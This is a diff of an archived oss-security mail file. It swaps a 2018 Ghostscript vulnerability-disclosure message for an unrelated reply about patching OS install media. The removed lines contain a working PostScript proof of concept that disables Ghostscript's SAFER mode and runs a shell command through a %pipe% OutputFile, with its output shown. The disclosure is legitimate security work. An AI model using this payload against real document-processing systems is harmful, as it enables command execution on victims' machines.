@@ -1,198 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/29/7
-Message-ID: <CAJ_zFk+dpXH453R0Hy5iHzYO2DkZjrBK3Sqh00Aie1z4=VDQOQ@mail.gmail.com>
-Date: Wed, 29 Aug 2018 13:14:41 -0700
-From: Tavis Ormandy <taviso@...gle.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/09/5
+Message-ID: <CANO=Ty0aVUpdVJGer0XaoWyKJ97px6sycxms67MpXv2CVO7oDg@mail.gmail.com>
+Date: Tue, 9 Jan 2018 11:33:48 -0700
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security <oss-security@...ts.openwall.com>
+Cc: Georgi Guninski <guninski@...inski.com>
+Subject: Re: Own on install. How grave it is?
 Content-Type: text/plain; charset=utf-8
 
-Thanks Marcus, here are some more necessary commits:
+One thing to keep in mind: most operating systems can have their
+install media updated, e.g. Windows slipstream where you make an
+install media with all available updates, or you can install updates
+without a network trivially (e.g. for RPM/DPKG based systems just have
+a USB key with a copy of the updates and install them). To say nothing
+of using orchestration tools that essentially can take care of it
+themselves, or generating master images that are up to date
+(containers/Docker are a good example here, you want to deploy up to
+date containers and then refresh the entire container for updates, not
+run yum update inside of it, cattle not pets and all that).
 
-http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
-# 699654 D /invalidaccess checks stop working after a failed restore
-http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
-# 699670 gssetresolution memory corruption
-http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
-# 699671 handling /undefined results in SEGV
-http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
-# 699676 PDF interpreter can leave dangerous operators available
+Obviously things that don't support this add risk (e.g. you MUST
+connect to the internet to get updates), and if the update tools
+themselves have a problem, you have a major problem.
 
-Please note that not all issues are resolved, and I have exploits that
-still work against HEAD.
 
-For example, this will still work if you pull master as of this writing:
 
-$ cat testcase.pdf
-%!PS
-% This is ghostscript bug #699687 (split out from bug #699654)
+On Tue, Jan 9, 2018 at 9:46 AM, Simon McVittie <smcv@...ian.org> wrote:
+> On Tue, 09 Jan 2018 at 08:37:08 -0700, Kurt Seifried wrote:
+>> Many OS installs/etc take a password during install
+>
+> I think Georgi was more concerned about the installation having a secure
+> design, but an insecure (vulnerable) implementation appearing on the
+> installation media due to either unfixed vulnerabilities, or
+> vulnerabilities that were fixed elsewhere but not on the installation
+> media?
+>
+> For instance, the Debian installer installs packages from the install
+> media (CD, USB stick, whatever), then immediately updates them
+> from the Internet if possible; but there's a chicken-and-egg
+> problem here, because that update has to be done with whatever
+> version of apt was on the media. If that version happens to suffer
+> from a vulnerability that can be exploited at that time (such as
+> https://security-tracker.debian.org/tracker/CVE-2016-1252 in apt itself,
+> or a vulnerability in the http or signature verification code that it
+> uses) then there's an opportunity for attack.
+>
+> The same is true for the kernel and network-device firmware used to boot
+> the installer. Debian mitigates this by releasing updated installation
+> media at every point release (about 1 per 2 months for stable, somewhat
+> slower for oldstable).
+>
+> I don't see any way to prevent that class of attack completely. Releasing
+> updated installation media sooner would mitigate it, but preparing
+> installation media is far from being a rapid process.
+>
+>> On Tue, Jan 9, 2018 at 6:42 AM, Georgi Guninski <guninski@...inski.com> wrote:
+>> > Debian jessie (old stable) is vulnerable to malicious mirror attack.
+>
+> Assuming you're referring to CVE-2016-1252, whether this is true depends
+> what you mean by jessie. Installs from older media (up to and including
+> 8.6) will be vulnerable to CVE-2016-1252 during the first upgrade run,
+> whereas installs from newer media (8.7 or newer, with the current version
+> being 8.10) are not vulnerable.
+>
+> It's true that there was a window (in this case it happens to be 1 month)
+> during which Debian offered an update for CVE-2016-1252, but the newest
+> available installation media still suffered from it.
+>
+>     smcv
 
-a0 % just select a papersize to initialize page device
 
-% You can't def HWResolution (for example), because currentpagedevice is
-readonly:
-%
-% GS>currentpagedevice wcheck ==
-% false
-%
-% But you can just put or astore into it, because the array itself is
-writable:
-% GS>currentpagedevice /HWResolution get wcheck ==
-% true
-%
-% If you put some junk in there, then grestore stops working.
-currentpagedevice /HWResolution get 0 (foobar) put
 
-% this grestore will fail, `stopped` just handles the error instead of
-aborting.
-{ grestore } stopped {} if
+-- 
 
-% now LockSafetyParams will be incorrectly unset, you can check like this:
-% GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams get
-== pop
-% false
-
-% we can change and configure devices now, so make sure we're using one with
-% a OutputFile property.
-(ppmraw) selectdevice
-
-% run a shell command
-mark /OutputFile (%pipe%id) currentdevice putdeviceprops
-showpage
-$ evince testcase.pdf
-uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
-context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-(libspectre) ghostscript reports: ioerror -12
-
-Tavis.
-
-On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@...e.de> wrote:
-
-> Hi,
->
-> I had 4 CVEs assigned yesterday afternoon already working from CERTs list,
-> see inline comments below. Please adjust if something is incorrect in them.
->
-> CERT has mailed overnight that they will take care of the CVE assignment,
-> so
-> I am defering the rest to them.
->
-> Ciao, Marcus
->
-> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
-> > Here is an update, Artifex made a press release
-> > <
-> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
-> >
-> > listing
-> > some necessary commits, but the list was incomplete.
-> >
-> > Here is a list of relevant commits I'm aware of so far, some issues are
-> > still open with working exploits available. It's my understanding that no
-> > new release is planned until late September, and vendors need to either
-> > ship a git snapshot when all issues are resolved, or apply patches. I
-> have
-> > testcases for each problem, but I think the bugs will be visible
-> eventually
-> > so I'm not posting them here.
-> >
-> >
-> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
-> > # 699671
-> > handling /undefined results in SEGV
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
-> > # 699659 missing type check in ztype
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
-> > 699654 A /invalidaccess checks stop working after a failed restore
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33 #
-> > 699654 B /invalidaccess checks stop working after a failed restore
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486 #
-> > 699654 C /invalidaccess checks stop working after a failed restore
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716 #
-> 699655
-> > - missing type checking in setcolor
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde #
-> 699656
->
->
-> > - LockDistillerParams boolean missing type checks
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
->         CVE-2018-15910
->
->
-> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
-> errors
->
->
-> >
-> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
-> > # 699660 - shading_param incomplete type checking
-> >
-> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
-> > # 699660 - shading_param incomplete type checking
->         CVE-2018-15909
->
->
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
-> > # 699661 - pdf14 garbage collection memory corruption
-> >
-> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
-> > # 699663 - .setdistillerkeys memory corruption
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
-> > # 699664 - corrupt device object after error in job
->
->
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
-> > # 699657 - .tempfile SAFER restrictions seem to be broken
->         CVE-2018-15908
->
-> >
-> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
->
->
-> > # 699665 - memory corruption in aesdecode
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
->
->         CVE-2018-15911
->
-> > # 699668 - .definemodifiedfont memory corruption if /typecheck is handled
-> >
-> > Tavis
-> >
-> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
-> > bfriesen@...ple.dallas.tx.us> wrote:
-> >
-> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
-> > > >
-> > > > (Regarding the `file.ps2' and `file.ps3' examples without `PS2:' or
-> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it seems
-> > > > that they ends up as:
-> > > >
-> > > > Domain: Coder; rights=Read; pattern="PS" ...
-> > > >
-> > > > ...so should be blocked by the workaround described in
-> > > > VU#332928. But please correct me if I'm wrong.)
-> > >
-> > > This is likely due to header magic detection (e.g. "%!PS-Adobe").  It
-> > > is possible that a different path will be taken if the common
-> > > Postscript header is not detected.  The file extension may then be
-> > > used as a hint.  Also, there are a wide varieties of ImageMagick
-> > > versions in use, with a wide variety of behaviors.
-> > >
-> > > The version of ImageMagick provided by the Ubuntu Linux I am using at
-> > > this moment dates from 2012!
-> > >
-> > > Bob
-> > > --
-> > > Bob Friesenhahn
-> > > bfriesen@...ple.dallas.tx.us,
-> http://www.simplesystems.org/users/bfriesen/
-> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
-> > >
->
-> --
-> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
-> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
-> meissner@...e.de>
->
-
+Kurt Seifried -- Red Hat -- Product Security -- Cloud
+PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+Red Hat Product Security contact: secalert@...hat.com
